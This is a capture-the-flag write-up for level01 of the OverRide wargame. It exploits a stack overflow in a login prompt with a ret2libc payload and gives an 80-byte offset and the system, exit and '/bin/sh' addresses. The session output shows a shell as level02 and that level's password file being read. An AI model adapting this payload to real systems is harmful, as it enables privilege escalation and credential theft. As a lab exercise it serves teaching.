# level01

In this level, we have a binary that asks for a username and a password. If we give it the correct username and password, technically it should open a shell for us. However, it doesn't, even if we give it the correct username and password.

To find the username and password, see the [gdb writeup](gdbwriteup.md).

We can see that the program is segfaulting if we enter a password that is too long, we will define the offset with [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

We can deduce that the offset is 80 bytes.

Different addresses needed for the exploit:

- `0xf7e6aed0` : address of system()
- `0xf7e5eb70` : adddress of exit()
- `0xf7f897ec` : address of "/bin/sh"

We need to convert all the addresses to little endian. 

- `0xf7e6aed0` -> `\xd0\xae\xe6\xf7`
- `0xf7e5eb70` -> `\x70\xeb\xe5\xf7`
- `0xf7f897ec` -> `\xec\x97\xf8\xf7`


Now, we can write the exploit:

```bash
(python -c 'print("dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
```

```bash
level01@OverRide:~$ (python -c 'print("dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```